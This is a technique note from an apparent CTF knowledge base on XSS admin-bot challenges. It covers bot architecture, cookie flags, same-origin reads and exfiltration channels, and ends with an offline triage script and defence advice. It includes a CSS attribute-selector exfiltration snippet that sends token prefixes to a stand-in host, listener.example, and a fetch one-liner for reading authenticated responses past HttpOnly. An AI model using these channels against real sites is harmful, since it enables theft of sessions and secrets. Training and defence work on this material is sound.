---
title: "XSS - Admin-Bot Challenge Architecture and Data Channels"
category: web
subcategory: xss
type: technique
tags: [xss, admin-bot, headless-chrome, puppeteer, playwright, report-endpoint, httponly, samesite, cookie-flags, same-origin-policy, exfiltration, out-of-band, interactsh, collaborator, css-exfiltration, attribute-selector, dns-exfiltration, ctf-infrastructure]
difficulty: medium
summary: "The bot is a headless browser with the flag in a cookie; what you can do with an XSS is decided by that cookie's flags and the challenge's egress."
when_to_use:
  - "A challenge exposes a /report endpoint that takes a URL and 'an admin will visit it'"
  - "You have XSS but need to work out how to get the flag back out"
  - "The cookie is HttpOnly, or the challenge has no outbound network"
  - "You are building or reviewing an XSS challenge and want the architecture to make sense"
related: [xss-contexts, xss-dom-clobbering, xss-csp-bypass, ssrf-fundamentals]
tools: [puppeteer, playwright, interactsh, burp]
---

## TL;DR

An admin-bot challenge is a headless browser that holds a secret and visits a URL you supply. Solving one is
three separate questions, and confusing them is where most time goes: **can you execute on the right
origin**, **can the executing code reach the secret**, and **can the result get back to you**. The cookie's
flags answer the second; the challenge's network policy answers the third.

## Recognise it

- A `/report`, `/submit`, `/visit` or `/feedback` endpoint taking a URL, with text like "an admin will review
  your report".
- The challenge ships its bot source - `bot.js`, `admin.py`, a `Dockerfile` with `puppeteer` or `playwright`.
  **Read it first.** It answers nearly every question below in about thirty seconds.
- A flag described as being "in the admin's cookie" or "visible on the admin's dashboard".
- Rate limiting or a queue on the report endpoint, which shapes how many attempts you get.

## Theory

### What the bot actually is

Nearly every one of these is the same forty lines:

```js
// The shape of essentially every CTF admin bot.
const browser = await puppeteer.launch({args: ['--no-sandbox']});
const page = await browser.newPage();
await page.setCookie({
  name: 'flag', value: FLAG, domain: 'challenge.local',
  httpOnly: false, secure: false, sameSite: 'Lax'
});
await page.goto(submittedUrl, {waitUntil: 'networkidle2', timeout: 5000});
await page.waitForTimeout(2000);
await browser.close();
```

Five parameters in that snippet decide the whole challenge, and they are all visible in the source:

| Parameter | What it decides |
|-----------|-----------------|
| `domain` on the cookie | which origin your code must run on |
| `httpOnly` | whether `document.cookie` can read it |
| `sameSite` | whether a cross-site navigation carries it |
| the timeout | how long your payload has to do its work |
| whether the URL is validated | whether you can send the bot off-origin at all |

### Question 1: executing on the right origin

The cookie belongs to an origin. The same-origin policy means your JavaScript can only read it if your
JavaScript is *running on that origin*. Pointing the bot at your own server gets you a page view and nothing
else - your script there cannot read the challenge's cookies or DOM.

So the report endpoint is not the vulnerability; it is the delivery mechanism. You still need an XSS **on the
challenge origin**, and the URL you submit must be a challenge URL that triggers it. A reflected XSS in a
query parameter is the canonical fit, which is why these challenges are usually paired.

Watch for a URL validator on the report endpoint restricting submissions to the challenge host. That is
usually a hint that on-origin execution is required, not an obstacle to route around.

### Question 2: reaching the secret

This is entirely decided by how the secret is stored:

- **Cookie without `HttpOnly`**: `document.cookie` reads it. The simplest shape, and the most common in
  beginner challenges.
- **Cookie with `HttpOnly`**: `document.cookie` cannot see it. But the cookie is still attached to requests
  the browser makes to that origin - so your code fetches an authenticated endpoint and reads the *response*.
  `fetch('/api/me', {credentials:'include'}).then(r => r.text())`. The flag is wherever the authenticated
  session can see it, not in the cookie jar. This is the single most common point of confusion in this
  category, and recognising it converts a "stuck" into a solve.
- **Flag rendered in the admin's DOM**: read it from the page. If it is on a different path, fetch that path
  same-origin and parse the response.
- **Flag in `localStorage`**: same-origin readable, no cookie involved.

`SameSite` matters for a different reason: it decides whether the cookie is attached when the bot *arrives*.
`Lax` (the modern default) attaches cookies on top-level GET navigations, which is exactly what the bot does
- so `Lax` is not usually an obstacle here. `Strict` would mean the cookie is not sent on a cross-site
navigation, but since the bot navigates directly to your challenge URL rather than being linked from
elsewhere, in practice this rarely blocks the flow. It matters much more for CSRF-shaped challenges.

### Question 3: getting the data back

Three architectures, and the challenge's Docker network config tells you which one you are in.

**Outbound network allowed.** The ordinary case. The payload makes a request to a host you control with the
data in it - a query string, a path, a POST body, an image URL. What you need is a listener that records
requests. Options, roughly in order of convenience: an out-of-band interaction service (Burp Collaborator,
`interactsh`), a request-logging web service, or your own listener on a public host or a tunnel.

Pick the channel to match the CSP: if `connect-src` blocks `fetch` but `img-src` is permissive, an image load
still leaks. The console tells you which directive refused.

**No outbound network.** Increasingly common, and it changes the puzzle rather than ending it. The bot can
reach the challenge app and nothing else. The flag must therefore be moved to somewhere *inside the
application* that you can then read as yourself:

- Post it to a feature that stores content - a comment, a note, a profile field, a "report" body - then go
  and read that content with your own account.
- Use an existing application feature that the admin can perform and you can observe.
- If the app has any read-write store keyed by something you control, that is the channel.

The mechanism to internalise: with no egress, the application itself becomes the exfiltration channel, so you
are looking for any admin-writable, attacker-readable surface.

**No network and no writable surface.** Then the channel is a side effect the bot's behaviour exposes -
typically timing, or whether the bot's visit succeeds or errors. These are slow, low-bandwidth, and usually
mean you have misread the challenge; re-read the bot source before committing to one.

### CSS-based exfiltration

Worth understanding as a mechanism because it works with **no JavaScript at all** - which makes it the answer
when CSP blocks script but permits styles, or when the injection point only allows markup.

The mechanism is attribute selectors plus a property that triggers a network fetch:

```css
input[name="token"][value^="a"] { background: url(https://listener.example/a); }
input[name="token"][value^="b"] { background: url(https://listener.example/b); }
```

The browser only fetches the background for the rule whose selector matches, so the request you receive tells
you the first character. Three structural limits shape how this is used:

1. **It reads attributes, not text content.** `value` on an `input` works because it is an attribute; the
   *current* value a user has typed is a property, not the attribute, so it often does not match. Text nodes
   are not selectable this way at all.
2. **One round per character.** Each prefix needs the stylesheet to be re-evaluated with new rules, so you
   need the page loaded repeatedly, or a mechanism to load new CSS mid-page. The classic approach is a
   sequence of `@import` rules where each import's response blocks and is served only after you have learned
   the previous character - turning a static stylesheet into an interactive oracle.
3. **`:has()` changes the picture.** Modern CSS `:has()` allows selecting a parent based on a descendant,
   which widens what a single pass can distinguish and removes some of the need for repeated loads.

CSP interacts with it exactly as you would expect: `style-src` decides whether your CSS loads, and
`img-src`/`font-src` decide whether the fetch that leaks the bit is permitted.

### Reliability

Bots are flaky and the timeout is short. What actually helps:

- **Test the payload yourself first**, in a real browser, on the real origin, with a cookie you set by hand.
  Most "the bot did not work" is a payload that never worked.
- **Keep it short.** `waitUntil: networkidle2` plus a two-second grace is not much time.
- **Do not depend on user interaction.** The bot does not click. Use handlers that fire on load.
- **Send something unconditional first.** Have the payload ping your listener before doing anything clever,
  so you can distinguish "did not execute" from "executed but failed".

## Attack

1. **Read the bot source.** Cookie domain, `httpOnly`, `sameSite`, timeout, URL validation.
2. **Find the XSS on the challenge origin.** The report endpoint delivers; it does not exploit.
3. **Decide how the secret is reached** - `document.cookie`, or an authenticated same-origin fetch.
4. **Determine the egress situation** from the Docker/compose config.
5. **Set up the receiver** and verify it records a request from your own browser first.
6. **Test end to end locally** before submitting, then submit once and watch the listener.

## Code

An offline reasoning helper for step 1-4: given the bot's configuration, work out which retrieval and which
channel apply. This is the triage, not the payload.

```python
#!/usr/bin/env python3
"""Work out what an admin-bot challenge's configuration permits.

Given the parameters visible in a typical bot source file, report how the secret
can be reached and which exfiltration channel is available.

Offline; pure decision logic.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass
class BotConfig:
    cookie_domain: str
    http_only: bool
    same_site: str = "Lax"          # "Lax" | "Strict" | "None"
    secret_location: str = "cookie"  # "cookie" | "dom" | "api" | "localstorage"
    outbound_network: bool = True
    url_must_match_origin: bool = True
    timeout_ms: int = 5000
    csp_script: bool = False         # True when CSP blocks inline script


def how_to_reach_secret(cfg: BotConfig) -> list[str]:
    """Which same-origin read gets at the secret."""
    steps: list[str] = []
    if cfg.secret_location == "cookie":
        if cfg.http_only:
            steps.append("cookie is HttpOnly: document.cookie cannot see it")
            steps.append("the cookie IS still attached to same-origin requests")
            steps.append("fetch an authenticated endpoint and read the RESPONSE body")
        else:
            steps.append("cookie is readable: document.cookie")
    elif cfg.secret_location == "dom":
        steps.append("read it out of the admin-only page's DOM")
    elif cfg.secret_location == "api":
        steps.append("fetch the authenticated API endpoint same-origin and parse the response")
    elif cfg.secret_location == "localstorage":
        steps.append("localStorage is same-origin readable; no cookie involved")
    return steps


def channels(cfg: BotConfig) -> list[str]:
    """Which exfiltration channels are available, best first."""
    out: list[str] = []
    if cfg.outbound_network:
        out.append("request to a host you control (fetch, image, navigation)")
        out.append("out-of-band interaction service (Collaborator / interactsh)")
        out.append("DNS lookup, if HTTP egress is filtered but resolution is not")
    else:
        out.append("in-band: write the secret into an app feature you can read back")
        out.append("in-band: any admin-writable, attacker-readable surface in the app")
        out.append("side channel (timing / error): slow, last resort, re-read the brief first")
    if cfg.csp_script:
        out.append("CSS attribute selectors: no JavaScript needed, leaks attribute prefixes")
    return out


def blockers(cfg: BotConfig) -> list[str]:
    out: list[str] = []
    if not cfg.url_must_match_origin:
        out.append("report endpoint accepts any URL - but off-origin pages cannot read "
                   "the challenge's cookies, so you still need on-origin execution")
    if cfg.same_site == "Strict":
        out.append("SameSite=Strict: cookie withheld on cross-site navigation; "
                   "a direct visit to the challenge origin still carries it")
    if cfg.timeout_ms < 3000:
        out.append(f"short timeout ({cfg.timeout_ms}ms): payload must act on load, without interaction")
    if cfg.csp_script:
        out.append("CSP blocks inline script: check for a nonce, a gadget, or go via CSS")
    return out


def triage(name: str, cfg: BotConfig) -> None:
    print(f"\n{name}")
    print(f"  origin required : {cfg.cookie_domain} (same-origin policy - your own host cannot read it)")
    print("  reach the secret:")
    for step in how_to_reach_secret(cfg):
        print(f"    - {step}")
    print("  channel:")
    for channel in channels(cfg):
        print(f"    - {channel}")
    issues = blockers(cfg)
    if issues:
        print("  watch out:")
        for issue in issues:
            print(f"    - {issue}")


if __name__ == "__main__":
    easy = BotConfig("challenge.local", http_only=False)
    triage("readable cookie, egress allowed", easy)
    assert "document.cookie" in how_to_reach_secret(easy)[0]

    # The case that most often stalls people: HttpOnly does not mean unreachable.
    httponly = BotConfig("challenge.local", http_only=True)
    triage("HttpOnly cookie, egress allowed", httponly)
    steps = how_to_reach_secret(httponly)
    assert any("RESPONSE" in s for s in steps), \
        "HttpOnly blocks document.cookie, not authenticated same-origin fetches"
    assert len(steps) == 3

    # No egress: the application itself has to carry the data.
    airgapped = BotConfig("challenge.local", http_only=True, outbound_network=False)
    triage("HttpOnly cookie, no outbound network", airgapped)
    ch = channels(airgapped)
    assert all("host you control" not in c for c in ch), "no external listener is reachable"
    assert any("in-band" in c for c in ch)

    # CSP blocks script: CSS becomes a channel, and it needs no JS at all.
    nocsp = BotConfig("challenge.local", http_only=False, csp_script=True)
    triage("script blocked by CSP", nocsp)
    assert any("CSS attribute selectors" in c for c in channels(nocsp))
    assert any("CSP blocks inline script" in b for b in blockers(nocsp))

    # A permissive report endpoint is not a shortcut.
    loose = BotConfig("challenge.local", http_only=False, url_must_match_origin=False)
    assert any("still need on-origin execution" in b for b in blockers(loose))

    print("\nself-test ok")
```

## Variants & pitfalls

- **`HttpOnly` is not the end.** The most common stall in this category. Fetch an authenticated endpoint and
  read the response.
- **Your own origin is useless.** Getting the bot to load your page proves the bot works and nothing more.
- **Test the payload as yourself first.** Set the cookie by hand and load the URL in a real browser.
- **The bot does not interact.** No clicks, no typing, no scrolling. Handlers must fire on load.
- **Timeouts are short.** Do the exfiltration first and the elaborate part second.
- **The queue is a rate limit.** Do not burn attempts on untested payloads.
- **Check the CSP before choosing a channel.** The refusing directive is printed in the console.
- **`networkidle2` can fire before your async work finishes**, and the browser closes mid-request. A
  synchronous image load is often more reliable than a `fetch` promise.
- **URL-encode the exfiltrated data.** Flags contain `{`, `}` and `_`, and an unencoded value can truncate
  the request or break the log line.
- **CSS exfiltration reads attributes, not text**, and the `value` *property* of an input is not its `value`
  *attribute*.

### Defence / what closes this

For the application: this is ordinary XSS defence - context-correct output encoding, a nonce-based CSP with
`base-uri 'none'`, `HttpOnly` and `Secure` on session cookies, and `SameSite` set deliberately. `HttpOnly`
does not stop an attacker acting *as* the user, so it is a mitigation, not a fix; the fix is not having the
XSS. Restrict egress from anything that renders untrusted content so that a successful injection has nowhere
to send data, and keep sensitive values out of pages that untrusted content can reach.

For anyone building one of these challenges: run the bot with `--no-sandbox` only inside a disposable
container, give it no credentials beyond the flag, put it on a network that reaches only the challenge, cap
the visit timeout, and rate-limit the report endpoint. A bot that can reach the internet and holds a real
secret is a liability rather than a puzzle.

## Tools

- `puppeteer` / `playwright` - run the bot locally to test against, which is far faster than submitting.
- `interactsh` - self-hostable out-of-band interaction server (HTTP and DNS).
- Burp Collaborator - the equivalent in Burp Suite Professional.
- `python3 -m http.server` - adequate as a local listener when testing on your own machine.
- Browser DevTools - the CSP violation messages name the directive that refused.

## References

- PortSwigger, exploiting cross-site scripting: https://portswigger.net/web-security/cross-site-scripting/exploiting
- PortSwigger, stealing cookies and other data via XSS: https://portswigger.net/web-security/cross-site-scripting/stealing-cookies
- MDN, `Set-Cookie` and the `HttpOnly` / `SameSite` attributes: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
- MDN, same-origin policy: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
- OWASP Cross Site Scripting Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- MDN, CSS attribute selectors: https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors
- Puppeteer documentation: https://pptr.dev/
- interactsh: https://github.com/projectdiscovery/interactsh
